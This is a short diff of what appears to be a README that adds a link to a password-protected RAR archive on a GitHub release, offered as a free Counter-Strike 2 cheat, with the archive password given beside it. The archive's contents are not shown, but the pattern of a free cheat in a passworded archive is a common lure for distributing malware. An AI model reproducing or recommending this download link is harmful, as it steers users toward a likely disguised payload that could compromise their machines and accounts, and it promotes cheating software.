@@ -1,4 +1,4 @@
-Download this. Download Cheat / click ME WINRAR password : 2025
+Download this. Download Cheat / [click ME](https://github.com/FREE-2025/Counter-Strike2-Cheat/releases/download/Cheats/Release.rar) WINRAR password : 2025
 
 HOW TO USE.
 
